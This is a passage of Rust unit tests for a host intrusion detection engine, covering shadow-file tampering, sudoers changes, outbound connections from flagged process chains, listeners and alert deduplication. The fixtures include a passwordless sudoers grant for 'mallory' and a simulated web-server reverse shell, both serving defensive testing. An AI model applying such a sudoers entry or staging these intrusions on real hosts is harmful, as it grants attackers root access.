        // inotify delivers MOVED_TO: writer is None, but useradd ran 1s ago.
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron")); // no session anywhere
        eng.process(exec(t, 500, 400, 0, "useradd", "/usr/sbin/useradd"));
        let alerts = eng.process(Event::File(file(
            t + Duration::seconds(1),
            "/etc/shadow",
            FileKind::MovedTo,
            None,
            None,
        )));
        assert!(alerts.is_empty(), "{:?}", alerts);
        // Same rename 60s later with nothing recent is unattended tampering.
        let later = at(
            &mut eng,
            Event::File(file(
                t + Duration::seconds(400),
                "/etc/shadow",
                FileKind::MovedTo,
                None,
                None,
            )),
        );
        assert!(
            has(&later, DetectionId::D4, Severity::Critical),
            "{:?}",
            later
        );
    }

    #[test]
    fn sudoers_nopasswd_unattended_is_critical() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
        let alerts = eng.process(Event::File(file(
            t,
            "/etc/sudoers.d/99-x",
            FileKind::Created,
            None,
            Some("mallory ALL=(ALL) NOPASSWD: ALL\n"),
        )));
        assert!(
            has(&alerts, DetectionId::D4, Severity::Critical),
            "{:?}",
            alerts
        );
    }

    // ---- D5 -------------------------------------------------------------

    #[test]
    fn connect_from_flagged_chain_fires_high() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
        let alerts = eng.process(Event::Connect(ConnectEvent {
            ts: t,
            pid: 200,
            uid: 33,
            daddr: "198.51.100.42".parse().unwrap(),
            dport: 443,
            comm: "bash".into(),
            container: false,
        }));
        assert!(
            has(&alerts, DetectionId::D5, Severity::High),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn dns_connects_are_ignored() {
        let mut baseline = Baseline::new(true, 24, Utc::now());
        baseline.complete = true;
        let mut eng = Engine::new(
            Config::default(),
            Allowlist::default(),
            baseline,
            "h".into(),
        );
        let t = Utc::now();
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(
            t,
            150,
            1,
            101,
            "resolved",
            "/usr/lib/systemd/resolved",
        ));
        let alerts = eng.process(Event::Connect(ConnectEvent {
            ts: t,
            pid: 150,
            uid: 101,
            daddr: "1.1.1.1".parse().unwrap(),
            dport: 53,
            comm: "resolved".into(),
            container: false,
        }));
        assert!(alerts.is_empty(), "{:?}", alerts);
    }

    #[test]
    fn flagged_chain_to_dns_port_still_fires() {
        // A reverse shell to attacker:53 must not hide behind the infra-port skip.
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
        let alerts = eng.process(Event::Connect(ConnectEvent {
            ts: t,
            pid: 200,
            uid: 33,
            daddr: "198.51.100.42".parse().unwrap(),
            dport: 53,
            comm: "bash".into(),
            container: false,
        }));
        assert!(
            has(&alerts, DetectionId::D5, Severity::High),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn web_server_novel_dest_fires_high_after_baseline() {
        let cfg = Config::default();
        let mut baseline = Baseline::new(true, 24, Utc::now());
        baseline.complete = true;
        let mut eng = Engine::new(cfg, Allowlist::default(), baseline, "h".into());
        let t = Utc::now();
        // Realistic tree: PID 1 is present, as the daemon seeds it from /proc.
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 100, 1, 0, "nginx", "/usr/sbin/nginx"));
        eng.process(exec(t, 101, 100, 33, "nginx", "/usr/sbin/nginx"));
        let alerts = eng.process(Event::Connect(ConnectEvent {
            ts: t,
            pid: 101,
            uid: 33,
            daddr: "198.51.100.99".parse().unwrap(),
            dport: 8443,
            comm: "nginx".into(),
            container: false,
        }));
        assert!(
            has(&alerts, DetectionId::D5, Severity::High),
            "{:?}",
            alerts
        );
    }

    #[test]
    fn first_connect_is_keyed_on_the_connecting_program() {
        let t = Utc::now();
        let mut baseline = Baseline::new(true, 24, t);
        let mut eng = Engine::new(
            Config::default(),
            Allowlist::default(),
            baseline.clone(),
            "h".into(),
        );
        let connect = |pid: u32, comm: &str, ts| {
            Event::Connect(ConnectEvent {
                ts,
                pid,
                uid: 0,
                daddr: "10.0.0.5".parse().unwrap(),
                dport: 5432,
                comm: comm.into(),
                container: false,
            })
        };
        eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
        eng.process(exec(t, 200, 1, 0, "backup", "/usr/local/bin/backup"));
        eng.process(connect(200, "backup", t));
        baseline = eng.baseline.clone();
        baseline.complete = true;
        eng.baseline = baseline;
        // A different program under the same PID 1 root is still new.
        eng.process(exec(t, 300, 1, 0, "implant", "/usr/local/bin/implant"));
        let later = t + Duration::hours(1);
        let alerts = eng.process(connect(300, "implant", later));
        assert!(
            alerts
                .iter()
                .any(|a| a.title == "First outbound connection from a program"),
            "{:?}",
            alerts
        );
        // The learned one stays quiet.
        let again = eng.process(connect(200, "backup", later));
        assert!(again.is_empty(), "{:?}", again);
    }

    #[test]
    fn listener_alerts_once_until_forgotten() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        let ev = || {
            Event::Listener(ListenerEvent {
                ts: t,
                proto: "tcp".into(),
                addr: "0.0.0.0".parse().unwrap(),
                port: 4444,
                pid: 0,
                comm: "x".into(),
            })
        };
        assert_eq!(eng.process(ev()).len(), 1);
        assert!(eng.process(ev()).is_empty());
        eng.forget_listener("tcp", 4444);
        // dedup window still open, so still suppressed by dedup - advance time.
        let later = t + Duration::seconds(400);
        let alerts = at(
            &mut eng,
            Event::Listener(ListenerEvent {
                ts: later,
                proto: "tcp".into(),
                addr: "0.0.0.0".parse().unwrap(),
                port: 4444,
                pid: 0,
                comm: "x".into(),
            }),
        );
        assert_eq!(alerts.len(), 1);
    }

    // ---- Engine plumbing ------------------------------------------------

    #[test]
    fn alerts_get_unique_refs_and_render() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        let alerts = eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
        assert!(!alerts.is_empty());
        let rendered = crate::alert::render_alert(&alerts[0]);
        assert!(rendered.contains("HER-"));
        assert!(rendered.contains("WHY THIS MATTERS"));
        assert!(rendered.contains("RECOMMENDED ACTION"));
    }

    #[test]
    fn restore_continues_ref_sequence_and_counters() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        let (day, _) = eng.refs.state();
        let day = day.to_string();
        let counters = Counters {
            day: day.clone(),
            alerts_today: 41,
            ..Counters::default()
        };
        eng.restore(t, &day, 41, Some(counters));
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        let alerts = eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
        assert!(alerts[0].ref_id.ends_with("-042"), "{}", alerts[0].ref_id);
        assert_eq!(eng.counters.alerts_today, 42);
    }

    #[test]
    fn self_alert_from_is_deduped() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        let finding = |sev, title: &str| {
            crate::alert::Finding::new(DetectionId::Self_, sev, title, "selfprotect|config-invalid")
        };
        assert!(eng
            .alert_from(finding(Severity::Low, "invalid"), t)
            .is_some());
        assert!(eng
            .alert_from(finding(Severity::Low, "invalid again"), t)
            .is_none());
        assert!(eng
            .alert_from(finding(Severity::Critical, "now critical"), t)
            .is_some());
    }

    #[test]
    fn future_timestamps_do_not_blind_dedup() {
        let mut eng = engine_without_baseline();
        let wall = Utc::now();
        eng.process_at(exec(wall, 100, 1, 33, "nginx", "/usr/sbin/nginx"), wall);
        // A bogus event dated a year ahead creates the dedup entry...
        let bogus = eng.process_at(
            exec(
                wall + Duration::days(365),
                200,
                100,
                33,
                "bash",
                "/usr/bin/bash",
            ),
            wall,
        );
        assert!(has(&bogus, DetectionId::D1, Severity::High));
        // ...and ten minutes later (past the window) the same signature must
        // alert again, not stay suppressed for a year.
        let later = wall + Duration::seconds(600);
        let again = eng.process_at(exec(later, 200, 100, 33, "bash", "/usr/bin/bash"), later);
        assert!(has(&again, DetectionId::D1, Severity::High), "{:?}", again);
    }

    #[test]
    fn expired_flags_are_pruned_behind_a_young_one() {
        let mut eng = engine_without_baseline();
        let wall = Utc::now();
        let flag = |ts| FlaggedChain {
            pids: vec![1234],
            detection: DetectionId::D1,
            severity: Severity::High,
            ts,
            reason: "x".into(),
        };
        eng.flags.push_back(flag(wall));
        for _ in 0..10 {
            eng.flags.push_back(flag(wall - Duration::hours(2)));
        }
        eng.tick(wall);
        assert_eq!(eng.flags.len(), 1);
    }

    #[test]
    fn tick_prunes_state() {
        let mut eng = engine_without_baseline();
        let t = Utc::now();
        eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
        let ip: IpAddr = "198.51.100.77".parse().unwrap();
        eng.process(Event::Auth(AuthEvent {
            ts: t,
            result: AuthResult::Failure,
            user: "root".into(),
            rhost: Some(ip),
            service: "sshd".into(),
            tty: "ssh".into(),
        }));
        assert_eq!(eng.tree.len(), 1);
        assert_eq!(eng.bursts.len(), 1);
        eng.tick(t + Duration::hours(49));
        assert!(eng.tree.is_empty());
        assert!(eng.bursts.is_empty());
    }
}
